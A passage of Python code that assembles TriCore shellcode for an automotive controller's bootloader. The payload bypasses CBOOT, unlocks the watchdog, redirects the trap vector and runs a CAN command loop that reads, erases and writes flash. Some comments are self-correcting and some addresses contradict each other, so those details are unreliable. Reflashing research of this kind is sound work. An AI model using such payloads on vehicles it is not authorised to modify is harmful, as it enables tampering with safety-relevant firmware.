def _tc_st_w(base: int, off16: int, src_d: int) -> bytes:
    return _tc_bol(0x59, src_d, base, off16)


def _tc_st_a(base_a: int, off16: int, src_a: int) -> bytes:
    """ST.A [a[base]]off16, a[src] — BOL format, opcode 0xB5."""
    return _tc_bol(0xB5, src_a, base_a, off16)


def _tc_ld_a(dst_a: int, base_a: int, off16: int) -> bytes:
    """LD.A a[dst], [a[base]]off16 — BOL format, opcode 0x99."""
    return _tc_bol(0x99, dst_a, base_a, off16)


def _tc_load32(dreg: int, value: int) -> bytes:
    lo = value & 0xFFFF
    hi = (value >> 16) & 0xFFFF
    return _tc_mov_u(dreg, lo) + _tc_addih(dreg, dreg, hi)


def _tc_store32(areg: int, off16: int, dreg: int, value: int) -> bytes:
    return _tc_load32(dreg, value) + _tc_st_w(areg, off16, dreg)


def _tc_ld_w(dst_d: int, base: int, off16: int) -> bytes:
    """LD.W d[dst], [a[base]]off16 — BOL format, opcode 0x19."""
    return _tc_bol(0x19, dst_d, base, off16)


def _tc_ld_w_short(dst_d: int, base: int) -> bytes:
    """LD.W d[dst], [a[base]] — 16-bit SRO, opcode 0x44 (off=0)."""
    # SRO format: [opcode] [off4<<4 | base]  — we use off=0
    return bytes([0x44 | ((base & 0xF) << 8) >> 8,
                  (dst_d & 0xF) << 4 | (base & 0xF)])


def _tc_st_w_short(base: int, src_d: int) -> bytes:
    """ST.W [a[base]], d[src] — 16-bit SSR, opcode 0x74."""
    return bytes([0x74, (base & 0xF) << 4 | (src_d & 0xF)])


def _tc_and(dst: int, s1: int, s2: int) -> bytes:
    """AND d[dst], d[s1], d[s2] — RR format, opcode 0x0F, func 0x08."""
    word = ((dst & 0xF) << 28
            | 0x08 << 20
            | (s2 & 0xF) << 12
            | (s1 & 0xF) << 8
            | 0x0F)
    return word.to_bytes(4, "little")


def _tc_or_imm(dst: int, src: int, const9: int) -> bytes:
    """OR d[dst], d[src], #const9 — RC format, opcode 0x8F, func 0x0A."""
    word = ((dst & 0xF) << 28
            | (0x0A) << 21
            | (const9 & 0x1FF) << 12
            | (src & 0xF) << 8
            | 0x8F)
    return word.to_bytes(4, "little")


def _tc_and_imm(dst: int, src: int, const9: int) -> bytes:
    """AND d[dst], d[src], #const9 — RC format, opcode 0x8F, func 0x08."""
    word = ((dst & 0xF) << 28
            | (0x08) << 21
            | (const9 & 0x1FF) << 12
            | (src & 0xF) << 8
            | 0x8F)
    return word.to_bytes(4, "little")


def _tc_sh(dst: int, src: int, const9: int) -> bytes:
    """SH d[dst], d[src], #const9 — RC format, opcode 0x8F, func 0x00."""
    word = ((dst & 0xF) << 28
            | (0x00) << 21
            | (const9 & 0x1FF) << 12
            | (src & 0xF) << 8
            | 0x8F)
    return word.to_bytes(4, "little")


def _tc_jz(dreg: int, disp8: int) -> bytes:
    """JZ d[dreg], disp8 — SB format, opcode 0x76."""
    # disp8 is in halfwords (2-byte units)
    return bytes([0x76, (dreg & 0xF) << 4 | ((disp8 >> 0) & 0xF),
                  (disp8 >> 4) & 0xFF])
    # Actually SB format is: byte0=opcode, byte1=disp8[7:0] with reg in const4
    # Wait — let me use the proper SBR format for JZ (16-bit):
    # JZ d[a], disp4 — SBR opcode 0x6E: byte0 = 0110_1110 but that's JNZ
    # JZ is opcode 0x76: format = [0x76] [disp8<<4 | d]... no.
    # TriCore 16-bit JZ: opcode=0x76, format SB:
    #   bit[7:0] = opcode (0x76)
    #   bit[11:8] = d (register)
    #   bit[15:12] / rest = disp8
    # Hmm, actually let me just use 32-bit JEQ with zero.


def _tc_jeq(d1: int, const4: int, disp15: int) -> bytes:
    """JEQ d[d1], #const4, disp15 — BRC format (32-bit).
    opcode 0xDF, bit31=0 selects JEQ. disp15 is signed 15-bit (bits[30:16])."""
    disp = disp15 & 0x7FFF  # 15-bit signed displacement
    word = (disp << 16            # bits[30:16], bit31=0 → JEQ
            | (const4 & 0xF) << 12
            | (d1 & 0xF) << 8
            | 0xDF)
    return word.to_bytes(4, "little")


def _tc_jne(d1: int, const4: int, disp15: int) -> bytes:
    """JNE d[d1], #const4, disp15 — BRC format (32-bit).
    opcode 0xDF, bit31=1 selects JNE. disp15 is signed 15-bit (bits[30:16])."""
    disp = disp15 & 0x7FFF  # 15-bit signed displacement
    word = (1 << 31               # bit31=1 → JNE variant
            | disp << 16          # bits[30:16]
            | (const4 & 0xF) << 12
            | (d1 & 0xF) << 8
            | 0xDF)
    return word.to_bytes(4, "little")


def _tc_j(disp24: int) -> bytes:
    """J disp24 — B format (32-bit unconditional jump), opcode 0x1D.
    disp24 is signed displacement in halfwords.
    Encoding: bits[7:0]=0x1D, bits[15:8]=disp24[23:16], bits[31:16]=disp24[15:0].
    Verified against SBOOT: 0x1D000020 = J +0x2000 hw = +16384 bytes."""
    d = disp24 & 0xFFFFFF  # 24-bit two's complement
    word = ((d & 0xFFFF) << 16    # disp24[15:0] in bits[31:16]
            | ((d >> 16) & 0xFF) << 8  # disp24[23:16] in bits[15:8]
            | 0x1D)
    return word.to_bytes(4, "little")


def _tc_j16(disp8: int) -> bytes:
    """J disp8 — 16-bit unconditional jump (SC format), opcode 0x3C.
    disp8 is in halfwords (2-byte units), signed."""
    return bytes([0x3C, disp8 & 0xFF])


def _tc_ji(areg: int) -> bytes:
    """JI a[areg] — indirect jump, 16-bit, opcode 0xDC."""
    return bytes([0xDC, areg & 0x0F])


def _tc_nop() -> bytes:
    return bytes([0x00, 0x00])


def _tc_mov_d(dst: int, val: int) -> bytes:
    """MOV d[dst], #const4 — 16-bit SRC format, opcode 0x82."""
    return bytes([0x82, (val & 0xF) << 4 | (dst & 0xF)])


def _tc_mov_aa(dst: int, src: int) -> bytes:
    """MOV.A a[dst], a[src] — 16-bit SRR format, opcode 0x40."""
    return bytes([0x40, (src & 0xF) << 4 | (dst & 0xF)])


def _tc_add_sc(const4: int) -> bytes:
    """ADD d15, d15, #const4 — 16-bit SRC format, opcode 0x92.
    SRC: bits[11:8]=S1/D (dest reg), bits[15:12]=const4.
    d[a] = d15 + const4, so a=15 for d15=d15+const4."""
    return bytes([0x92, ((const4 & 0xF) << 4) | 0xF])


def _tc_calli(areg: int) -> bytes:
    """CALLI a[areg] — indirect call, 32-bit. Available on TC1.3.1 (confirmed in DRIVER binary)."""
    word = (areg & 0xF) << 8 | 0x2D
    return word.to_bytes(4, "little")


def _tc_call(disp24: int) -> bytes:
    """CALL disp24 — PC-relative call, B format (32-bit), opcode 0x6D.
    disp24 is signed displacement in halfwords. Available on TC1.3.1+.
    Same encoding as J (0x1D) but opcode 0x6D."""
    d = disp24 & 0xFFFFFF
    word = ((d & 0xFFFF) << 16
            | ((d >> 16) & 0xFF) << 8
            | 0x6D)
    return word.to_bytes(4, "little")


def _tc_mov_d_d(dst: int, src: int) -> bytes:
    """MOV d[dst], d[src] — 16-bit, opcode 0x02."""
    return bytes([0x02, (src & 0xF) << 4 | (dst & 0xF)])


def _tc_mov_d_a(dst_d: int, src_a: int) -> bytes:
    """MOV.D d[dst], a[src] — 16-bit, opcode 0x80."""
    return bytes([0x80, (src_a & 0xF) << 4 | (dst_d & 0xF)])


def _tc_add(dst: int, s1: int, s2: int) -> bytes:
    """ADD d[dst], d[s1], d[s2] — RR format, opcode 0x0B."""
    word = ((dst & 0xF) << 28
            | 0x00 << 20   # func=0 for ADD
            | (s2 & 0xF) << 12
            | (s1 & 0xF) << 8
            | 0x0B)
    return word.to_bytes(4, "little")


def _tc_addi(dst: int, src: int, const16: int) -> bytes:
    """ADDI d[dst], d[src], #const16 — RLC format, opcode 0x1B."""
    return _tc_rlc(0x1B, dst, const16, s1=src)


def _tc_lea_short(dst: int, base: int, off: int) -> bytes:
    """LEA a[dst], [a[base]]off — 16-bit format if off fits, else 32-bit."""
    return _tc_lea(dst, base, off)


def _tc_load_addr(areg: int, value: int) -> bytes:
    """Load 32-bit address into a-register: movh.a + lea.
    Compensates for LEA's sign-extended 16-bit offset."""
    lo = value & 0xFFFF
    hi = (value >> 16) & 0xFFFF
    if lo >= 0x8000:
        hi = (hi + 1) & 0xFFFF  # compensate: LEA sign-extends lo as negative
    return _tc_movh_a(areg, hi) + _tc_lea(areg, areg, lo)


# ---------------------------------------------------------------------------
# Flash Manager shellcode (runs in PSPR, bypasses CBOOT entirely)
# ---------------------------------------------------------------------------
#
# Polling-based CAN command loop. DRIVER block (erase/write/verify routines)
# is uploaded to PSPR at 0xD4000000. Flash Manager code starts at 0xD4000900.
# Uses SBOOT's already-configured MultiCAN MOs for CAN 0x640/0x641.
#
# PSPR layout:
#   0xD4000000 - 0xD400080D: DRIVER block (from bin file)
#   0xD4000000 - FM code (executed directly by SBOOT)
#   0xD4000000 + FM_SIZE (aligned to 0x100): DRIVER block
#   After DRIVER: param struct + data buffer
#
# DRIVER offsets (relative to DRIVER base, from bin analysis):
DRIVER_ERASE_OFF = 0x204    # erase flash sectors
DRIVER_EXIT_OFF = 0x300     # flash exit / status check (writes 0xF5 reset cmd)
DRIVER_PROGVER_OFF = 0x334  # program + verify (writes data AND reads back to compare)
DRIVER_SIZE = 0x80E         # total DRIVER block size

MULTICAN_BASE = 0xF0004000
MO_BASE = 0xF0004400        # MO0 base (TC1766: 32 MOs at 0xF0004400-0xF00047FF)
MO_STRIDE = 0x20

# MO register offsets
MO_MODATAL = 0x10
MO_MODATAH = 0x14
MO_MOAR = 0x18
MO_MOCTR = 0x1C  # write: set/reset bits
MO_MOSTAT = 0x1C  # read: status

# MOCTR bits (write) — TC1766 MultiCAN: MOSTAT bit N → RESET at bit N, SET at bit N+16
MOCTR_SETTXRQ = 1 << 24   # bit 8 in MOSTAT → SET at bit 24
MOCTR_SETRXEN = 1 << 23   # bit 7 in MOSTAT → SET at bit 23
MOCTR_SETNEWDAT = 1 << 19  # bit 3 in MOSTAT → SET at bit 19
MOCTR_SETMSGVAL = 1 << 21  # bit 5 in MOSTAT → SET at bit 21
MOCTR_RESRXPND = 1 << 0   # bit 0 in MOSTAT (RXPND) → RESET at bit 0
MOCTR_RESTXPND = 1 << 1   # bit 1 in MOSTAT (TXPND) → RESET at bit 1
MOCTR_RESNEWDAT = 1 << 3  # bit 3 in MOSTAT (NEWDAT) → RESET at bit 3

# MOSTAT bits (read)
MOSTAT_NEWDAT = 1 << 3    # new data received
MOSTAT_TXPND = 1 << 1     # transmit pending complete

# SCU reset
SCU_RSTCON = 0xF0000010

# Flash Manager command IDs
FM_CMD_PING = 0x01
FM_CMD_READ = 0x02
FM_CMD_ERASE = 0x03
FM_CMD_WRITE_START = 0x04
FM_CMD_WRITE_DATA = 0x05
FM_CMD_VERIFY = 0x06
FM_CMD_FLASH_RESET = 0x07
FM_CMD_RESET = 0xFF

# ACK interval for streaming write (every N frames)
FM_WRITE_ACK_INTERVAL = 64


MVP_DSPR_MARKER_ADDR = 0xD000C000  # DSPR address for execution marker
MVP_DSPR_MARKER_VAL = 0xDEADBEEF   # value to write if code executes


def _tc_ret() -> bytes:
    """RET — return from call. Restores upper context from CSA."""
    return bytes([0x00, 0x90])


def _build_mvp_shellcode() -> bytes:
    """
    Minimal test shellcode — three phases:

    Phase A: Write 0xDEADBEEF to DSPR (proves data write works)
    Phase B: Blast CAN TX on all 8 MOs (tests direct MultiCAN TX)
    Phase C: RET — returns to sboot_execute, which sends a positive
             response to the host. This proves:
             - Code execution from PSPR works
             - CAN TX works (via SBOOT's own response path)

    If we see a positive response to execute phase 2 → code runs.
    If we also see CAN frames on candump → our direct MO writes work.
    """
    sc = bytearray()

    # --- Phase A: DSPR marker ---
    sc += _tc_load32(0, MVP_DSPR_MARKER_VAL)
    sc += _tc_load_addr(14, MVP_DSPR_MARKER_ADDR)
    sc += _tc_st_w(14, 0, 0)

    # --- Phase B: CAN blast on all 8 MOs ---
    sc += _tc_load32(0, 0xDEAD0041)
    sc += _tc_load32(1, 0xBEEFCAFE)
    sc += _tc_load32(2, MOCTR_SETTXRQ | MOCTR_SETNEWDAT | MOCTR_SETMSGVAL)
    sc += _tc_load32(3, 0x08000000)  # MOFCR: DLC=8
    for mo in range(8):
        mo_addr = MO_BASE + mo * MO_STRIDE
        sc += _tc_load_addr(15, mo_addr)
        sc += _tc_st_w(15, 0, 3)          # MOFCR = DLC=8
        sc += _tc_st_w(15, MO_MODATAL, 0)
        sc += _tc_st_w(15, MO_MODATAH, 1)
        sc += _tc_st_w(15, MO_MOCTR, 2)

    # --- Phase C: RET to sboot_execute ---
    # sboot_execute will send positive response (0x78) for service 0x38
    sc += _tc_ret()

    log.info(f"MVP shellcode: {len(sc)} bytes")
    return bytes(sc)


def _build_flash_manager(driver_base: int, param_base: int, buffer_base: int,
                         shellcode_base: int | None = None) -> bytes:
    """
    Build the Flash Manager shellcode as raw TriCore machine code.

    The shellcode is a polling-based CAN command loop that:
    1. Discovers SBOOT's RX/TX MOs by scanning for CAN IDs 0x640/0x641
    2. Polls RX MO for new commands
    3. Dispatches commands: PING, READ, ERASE, WRITE, VERIFY, RESET
    4. Calls DRIVER routines for flash erase/write/verify

    Register allocation (persistent across main loop):
      a8  = RX MO base address (CAN ID 0x640)
      a9  = TX MO base address (CAN ID 0x641)
      a10 = param struct base
      a11 = stack pointer (0xD000E000, in DSPR)
      a12 = buffer base
      d8  = write buffer offset (accumulator)
      d9  = write target address
      d10 = write total length

    Args:
        driver_base: absolute address of DRIVER block in PSPR
        param_base:  absolute address of param struct
        buffer_base: absolute address of data buffer

    Returns: shellcode bytes, placed at 0xD4000000 (executed directly).
    """
    DRIVER_ERASE = driver_base + DRIVER_ERASE_OFF
    DRIVER_EXIT = driver_base + DRIVER_EXIT_OFF
    DRIVER_PROGVER = driver_base + DRIVER_PROGVER_OFF
    DRIVER_WDT_UNLOCK = driver_base + 0x5A4  # FUN_080005a4: WDT service (clear ENDINIT)
    DRIVER_WDT_LOCK = driver_base + 0x56C    # FUN_0800056c: WDT service (set ENDINIT)
    FM_PARAM = param_base
    FM_BUFFER = buffer_base
    FM_BUFFER_SIZE = 0xD4003FFF - FM_BUFFER + 1
    sc = bytearray()

    # ===================================================================
    # DEBUG: CAN blast on TX MO (MO1) to prove FM code is reached.
    # No trampoline needed — FM is at offset 0, SBOOT jumps here directly.
    # ===================================================================
    sc += _tc_load32(0, 0x00000042)        # MODATAL: 0x42 = 'B' for "Boot"
    sc += _tc_load32(1, 0x00000900)        # MODATAH: 0x900 = our offset
    sc += _tc_load32(2, MOCTR_SETTXRQ | MOCTR_SETNEWDAT | MOCTR_SETMSGVAL)
    sc += _tc_load32(3, 0x08000000)        # MOFCR: DLC=8
    # MO1 (TX, 0x641) at MO_BASE + 0x20
    sc += _tc_load_addr(15, MO_BASE + MO_STRIDE)
    sc += _tc_st_w(15, 0, 3)              # MOFCR = DLC=8
    sc += _tc_st_w(15, MO_MODATAL, 0)
    sc += _tc_st_w(15, MO_MODATAH, 1)
    sc += _tc_st_w(15, MO_MOCTR, 2)

    # ===================================================================
    # WDT service callback — DRIVER calls *(param+0x14)() during erase/
    # write/verify polling loops. We service the WDT to prevent reset.
    # Jump OVER the callback so main code doesn't fall into it.
    # ===================================================================

    # Helper: OR register-register (used in multiple places)
    def _tc_or_rr(dst, s1, s2):
        word = ((dst & 0xF) << 28 | 0x0A << 20 | (s2 & 0xF) << 12 | (s1 & 0xF) << 8 | 0x0F)
        return word.to_bytes(4, "little")

    # Helper: MOV.A a[dst], d[src] — 16-bit, opcode 0x60
    def _tc_mov_a_d(a_dst, d_src):
        return bytes([0x60, (d_src & 0xF) << 4 | (a_dst & 0xF)])

    sc_base = shellcode_base if shellcode_base is not None else SHELLCODE_ADDR

    j_over_cb_pos = len(sc)
    sc += _tc_j(0)  # placeholder — patched after callback is built
    wdt_callback_offset = len(sc)
    WDT_CALLBACK_ADDR = sc_base + wdt_callback_offset

    # WDT service callback body (uses lower context regs only — safe in CALLI)
    # Load WDT register addresses (a2/a3 = lower ctx, caller-saved)
    sc += _tc_load_addr(2, 0xF0000020)    # a2 = WDT_CON0
    sc += _tc_load_addr(3, 0xF0000024)    # a3 = WDT_CON1
    # Password Access
    sc += _tc_mov_u(5, 0xFF01)
    sc += _tc_addih(5, 5, 0xFFFF)         # d5 = 0xFFFFFF01
    sc += _tc_ld_w(7, 2, 0)              # d7 = WDT_CON0
    sc += _tc_ld_w(6, 3, 0)              # d6 = WDT_CON1
    sc += _tc_and(7, 7, 5)               # d7 &= 0xFFFFFF01
    sc += _tc_or_imm(7, 7, 0xF0)         # d7 |= 0xF0
    sc += _tc_and_imm(6, 6, 0xC)         # d6 &= 0xC
    sc += _tc_or_rr(7, 7, 6)             # d7 |= d6
    sc += _tc_st_w(2, 0, 7)              # WDT_CON0 = password access
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])  # ISYNC
    # Modify: LCK=1, ENDINIT=1 (services WDT timer)
    sc += _tc_mov_u(5, 0xFFF0)
    sc += _tc_addih(5, 5, 0xFFFF)         # d5 = 0xFFFFFFF0
    sc += _tc_and(7, 7, 5)               # d7 &= 0xFFFFFFF0
    sc += _tc_or_imm(7, 7, 0x3)          # d7 |= 0x3
    sc += _tc_st_w(2, 0, 7)              # WDT_CON0 = modify (service)
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])  # ISYNC
    sc += _tc_ret()
    wdt_callback_end = len(sc)

    # Patch J-over-callback
    j_cb_disp = (wdt_callback_end - j_over_cb_pos) // 2
    sc[j_over_cb_pos:j_over_cb_pos + 4] = _tc_j(j_cb_disp)

    # ===================================================================
    # INIT: Set up SP, param struct pointer, discover MOs
    # ===================================================================

    # a11 = 0xD000E000 (stack pointer — top of DSPR)
    sc += _tc_load_addr(11, 0xD000E000)

    # a10 = param struct base
    sc += _tc_load_addr(10, FM_PARAM)

    # a12 = buffer base
    sc += _tc_load_addr(12, FM_BUFFER)

    # d8 = 0 (write buffer offset)
    sc += _tc_mov_d(8, 0)

    # --- MO Discovery: scan MO0-MO7 for CAN IDs 0x640 and 0x641 ---
    # a2 = MO_BASE (0xF0004100)
    sc += _tc_load_addr(2, MO_BASE)

    # d2 = 0x640 << 18 (expected MOAR value for standard ID 0x640)
    sc += _tc_load32(2, 0x640 << 18)
    # d3 = 0x641 << 18
    sc += _tc_load32(3, 0x641 << 18)
    # d4 = mask for standard ID bits: 0x1FFC0000 (bits [28:18])
    sc += _tc_load32(4, 0x1FFC0000)

    # d15 = loop counter (counts down 7..0, 8 iterations)
    sc += _tc_mov_d(15, 7)

    # a8 = 0 (RX MO not found yet)
    sc += _tc_movh_a(8, 0)
    # a9 = 0 (TX MO not found yet)
    sc += _tc_movh_a(9, 0)

    # Loop: check each MO
    mo_scan_loop = len(sc)
    # d5 = *(a2 + MOAR) — read arbitration register
    sc += _tc_ld_w(5, 2, MO_MOAR)
    # d6 = d5 & d4 (mask to ID bits)
    sc += _tc_and(6, 5, 4)

    # if d6 == d2 (0x640) → a8 = a2
    # JNE d6, d2 → skip_rx (use 32-bit compare)
    # We need JNE reg,reg — TriCore BRR format:
    # Actually let's use SUB + JNZ pattern instead
    # d7 = d6 - d2; if d7==0 → match
    # SUB d7, d6, d2 — RR opcode 0x0B func=0x08
    def _tc_sub(dst, s1, s2):
        word = ((dst & 0xF) << 28 | 0x08 << 20 | (s2 & 0xF) << 12 | (s1 & 0xF) << 8 | 0x0B)
        return word.to_bytes(4, "little")

    sc += _tc_sub(7, 6, 2)
    # JNZ d7, +2 (skip mov.aa) — 16-bit SBR format opcode 0xEE? No.
    # JNZ d15, disp4 = 0xEE but only for d15.
    # Use JEQ d7, #0, +2 (halfwords) to jump to mov.aa, else skip
    # Actually: JNE d7, #0, skip_rx → if NOT zero, skip the mov.aa
    # disp15 is in halfwords. mov.aa is 2 bytes = 1 halfword.
    # So skip 1+1 = jump over 1 instruction (mov.aa = 1 hw).
    # JNE is 4 bytes itself. After JNE: mov.aa (2 bytes), then continue.
    # disp15 = +2 halfwords (skip the mov.aa = 2 bytes = 1 hw, but disp includes self? No.)
    # JNE disp is relative to JNE instruction start, in halfwords.
    # JNE d7, #0, +2 → skip 2 halfwords = 4 bytes from JNE start = skip mov.aa.
    # Wait: +2 means PC + 2*2 = PC + 4 bytes from JNE start. JNE itself is 4 bytes.
    # So +2 means land at JNE+4 = right after JNE. That's no skip.
    # disp15 of +3 means JNE_addr + 6 = skip 2 bytes after JNE = skip mov.aa.
    sc += _tc_jne(7, 0, 3)  # if d7 != 0, skip +3 hw = +6 bytes (skip mov.aa)
    sc += _tc_mov_aa(8, 2)   # a8 = a2 (RX MO found)

    # Check TX: d7 = d6 - d3
    sc += _tc_sub(7, 6, 3)
    sc += _tc_jne(7, 0, 3)
    sc += _tc_mov_aa(9, 2)   # a9 = a2 (TX MO found)

    # a2 += MO_STRIDE (0x20)
    sc += _tc_lea(2, 2, MO_STRIDE)
    # d15 -= 1 (count down)
    sc += _tc_add_sc(-1)  # ADD d15, d15, #-1
    # if d15 != -1, loop back (8 iterations: d15 = 7,6,...,1,0)
    jne_pos = len(sc)
    disp = (mo_scan_loop - jne_pos) // 2
    sc += _tc_jne(15, -1, disp & 0x7FFF)

    # After loop: a8 = RX MO base, a9 = TX MO base
    # Enable RX: write MOCTR = SETRXEN | SETMSGVAL | RESNEWDAT
    sc += _tc_load32(0, MOCTR_SETRXEN | MOCTR_SETMSGVAL | MOCTR_RESNEWDAT)
    sc += _tc_st_w(8, MO_MOCTR, 0)

    # Set DLC=8 on TX MO: MOFCR[27:24] = 8
    sc += _tc_load32(0, 0x08000000)
    sc += _tc_st_w(9, 0, 0)  # MOFCR at offset +0x00

    # --- Load WDT register addresses into a6/a7 (persistent) ---
    sc += _tc_load_addr(6, 0xF0000020)    # a6 = WDT_CON0
    sc += _tc_load_addr(7, 0xF0000024)    # a7 = WDT_CON1

    # --- Set BTV to our trap handler (one-time, requires ENDINIT clear) ---
    # Password Access
    sc += _tc_mov_u(5, 0xFF01)
    sc += _tc_addih(5, 5, 0xFFFF)         # d5 = 0xFFFFFF01
    sc += _tc_ld_w(15, 6, 0)             # d15 = WDT_CON0
    sc += _tc_ld_w(7, 7, 0)              # d7 = WDT_CON1
    sc += _tc_and(15, 15, 5)             # d15 &= 0xFFFFFF01
    sc += _tc_or_imm(15, 15, 0xF0)       # d15 |= 0xF0
    sc += _tc_and_imm(7, 7, 0xC)         # d7 &= 0xC
    sc += _tc_or_rr(15, 15, 7)           # d15 |= d7
    sc += _tc_st_w(6, 0, 15)             # WDT_CON0 = password access
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])  # ISYNC
    # Modify: ENDINIT=0
    sc += _tc_mov_u(5, 0xFFF0)
    sc += _tc_addih(5, 5, 0xFFFF)         # d5 = 0xFFFFFFF0
    sc += _tc_and(15, 15, 5)             # d15 &= 0xFFFFFFF0
    sc += _tc_or_imm(15, 15, 0x2)         # d15 |= 0x2 (LCK=1, ENDINIT=0)
    sc += _tc_st_w(6, 0, 15)             # WDT_CON0 = modify
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])  # ISYNC
    # Set BTV (PLACEHOLDER — patched after trap table is built)
    btv_load_pos = len(sc)
    sc += _tc_load32(5, 0xDEADDEAD)       # patched later
    sc += _tc_rlc(0xCD, 0, 0xFE24, 5)     # MTCR BTV, d5
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])  # ISYNC
    # Re-lock ENDINIT (Password Access + Modify ENDINIT=1)
    sc += _tc_mov_u(5, 0xFF01)
    sc += _tc_addih(5, 5, 0xFFFF)
    sc += _tc_ld_w(15, 6, 0)
    sc += _tc_ld_w(7, 7, 0)
    sc += _tc_and(15, 15, 5)
    sc += _tc_or_imm(15, 15, 0xF0)
    sc += _tc_and_imm(7, 7, 0xC)
    sc += _tc_or_rr(15, 15, 7)
    sc += _tc_st_w(6, 0, 15)
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])
    sc += _tc_mov_u(5, 0xFFF0)
    sc += _tc_addih(5, 5, 0xFFFF)
    sc += _tc_and(15, 15, 5)
    sc += _tc_or_imm(15, 15, 0x3)         # LCK=1, ENDINIT=1
    sc += _tc_st_w(6, 0, 15)
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])

    # ===================================================================
    # MAIN LOOP: Service WDT, then poll RX MO for new data
    # ===================================================================
    main_loop = len(sc)

    # --- WDT Service (from DRIVER FUN_0800056c: set ENDINIT, resets timer) ---
    # Step 1: Password Access
    sc += _tc_mov_u(5, 0xFF01)
    sc += _tc_addih(5, 5, 0xFFFF)         # d5 = 0xFFFFFF01
    sc += _tc_ld_w(15, 6, 0)             # d15 = WDT_CON0
    sc += _tc_ld_w(7, 7, 0)              # d7 = WDT_CON1 (use d7 temp)
    sc += _tc_and(15, 15, 5)             # d15 &= 0xFFFFFF01
    sc += _tc_or_imm(15, 15, 0xF0)       # d15 |= 0xF0
    sc += _tc_and_imm(7, 7, 0xC)         # d7 &= 0xC
    sc += _tc_or_rr(15, 15, 7)           # d15 |= d7
    sc += _tc_st_w(6, 0, 15)             # WDT_CON0 = password access
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])  # ISYNC
    # Step 2: Modify (set ENDINIT=1, LCK=1 → services WDT)
    sc += _tc_mov_u(5, 0xFFF0)
    sc += _tc_addih(5, 5, 0xFFFF)         # d5 = 0xFFFFFFF0
    sc += _tc_and(15, 15, 5)             # d15 &= 0xFFFFFFF0
    sc += _tc_or_imm(15, 15, 0x3)         # d15 |= 0x3 (LCK=1, ENDINIT=1)
    sc += _tc_st_w(6, 0, 15)             # WDT_CON0 = modify (service)
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])  # ISYNC

    # d0 = *(a8 + MOSTAT) — read status
    sc += _tc_ld_w(0, 8, MO_MOSTAT)
    # Check NEWDAT (bit 3)
    sc += _tc_and_imm(1, 0, MOSTAT_NEWDAT)
    # if d1 == 0, loop back (no new data)
    jz_pos = len(sc)
    disp = (main_loop - jz_pos) // 2
    sc += _tc_jeq(1, 0, disp & 0x7FFF)

    # New data! Read MODATAL and MODATAH
    sc += _tc_ld_w(0, 8, MO_MODATAL)  # d0 = bytes [3:0]
    sc += _tc_ld_w(1, 8, MO_MODATAH)  # d1 = bytes [7:4]

    # Clear NEWDAT + RXPND
    sc += _tc_load32(2, MOCTR_RESNEWDAT | MOCTR_RESRXPND)
    sc += _tc_st_w(8, MO_MOCTR, 2)

    # Re-enable RX
    sc += _tc_load32(2, MOCTR_SETRXEN | MOCTR_SETMSGVAL)
    sc += _tc_st_w(8, MO_MOCTR, 2)

    # Command byte = d0 & 0xFF (lowest byte of MODATAL)
    sc += _tc_and_imm(2, 0, 0xFF)

    # ===================================================================
    # COMMAND DISPATCH
    # ===================================================================

    # We use a chain of JEQ to dispatch. Each handler ends with J main_loop.
    # Save raw d0, d1 for handlers
    # d12 = d0 (MODATAL), d13 = d1 (MODATAH) — preserved across handlers
    sc += _tc_mov_d_d(12, 0)
    sc += _tc_mov_d_d(13, 1)

    # --- Check PING (0x01) ---
    dispatch_start = len(sc)
    ping_jne_pos = len(sc)
    sc += _tc_jne(2, FM_CMD_PING, 0)  # placeholder disp, patch later
    ping_handler = len(sc)

    # PING handler: send [0x41, 0x00, 'D', 'Q', '2', '5', '0', 0x00]
    sc += _tc_load32(0, 0x00514441)  # bytes [3:0] = 41 00 44 51  (LE: 0x41, 0x00, 'D'=0x44, 'Q'=0x51)
    # Wait — CAN MODATAL is bytes[3:0] in LE u32. So MODATAL[0]=byte0, etc.
    # We want: byte0=0x41, byte1=0x00, byte2='D'=0x44, byte3='Q'=0x51
    # As u32 LE: 0x5144_0041
    sc = sc[:-4]  # remove wrong load
    sc += _tc_load32(0, 0x51440041)  # MODATAL: [0x41, 0x00, 0x44, 0x51]
    sc += _tc_load32(1, 0x00303532)  # MODATAH: ['2'=0x32, '5'=0x35, '0'=0x30, 0x00]
    # Jump to send_response
    send_resp_jmp = len(sc)
    sc += _tc_j(0)  # placeholder — patch later
    ping_end = len(sc)

    # Patch PING JNE to skip to after ping handler
    ping_skip_disp = (ping_end - ping_jne_pos) // 2
    sc[ping_jne_pos:ping_jne_pos + 4] = _tc_jne(2, FM_CMD_PING, ping_skip_disp)

    # --- Check READ (0x02) ---
    read_jne_pos = len(sc)
    sc += _tc_jne(2, FM_CMD_READ, 0)  # placeholder
    read_handler = len(sc)

    # READ handler: extract address from d0 bytes[1..4] and length from d0/d1
    # d0 = MODATAL = [cmd, addr_b0, addr_b1, addr_b2]
    # d1 = MODATAH = [addr_b3, len_b0, len_b1, 0]
    # Address = (d12 >> 8) | ((d13 & 0xFF) << 24)
    # But we need: addr = addr3<<24 | addr2<<16 | addr1<<8 | addr0
    # d12 >> 8 gives [0, cmd... wait no.
    # d12 as u32 LE bytes: [byte0=cmd, byte1=addr3, byte2=addr2, byte3=addr1]
    # d12 >> 8 = [0, byte0, byte1, byte2] = [0, cmd, addr3, addr2] — that's wrong.
    # Actually we want big-endian address from bytes 1-4 of the CAN frame.
    # CAN frame byte layout: [0]=cmd, [1]=ADDR3, [2]=ADDR2, [3]=ADDR1, [4]=ADDR0, [5]=LEN1, [6]=LEN0, [7]=0
    # MODATAL u32 LE = byte[3]<<24 | byte[2]<<16 | byte[1]<<8 | byte[0]
    #                = ADDR1<<24 | ADDR2<<16 | ADDR3<<8 | cmd
    # MODATAH u32 LE = byte[7]<<24 | byte[6]<<16 | byte[5]<<8 | byte[4]
    #                = 0<<24 | LEN0<<16 | LEN1<<8 | ADDR0
    #
    # So address = ADDR3<<24 | ADDR2<<16 | ADDR1<<8 | ADDR0
    #            = ((d12>>8) & 0xFF)<<24 | ((d12>>16)&0xFF)<<16 | ((d12>>24)&0xFF)<<8 | (d13&0xFF)
    # This is byte-swapping the upper 3 bytes of d12 and prepending d13's lowest byte.
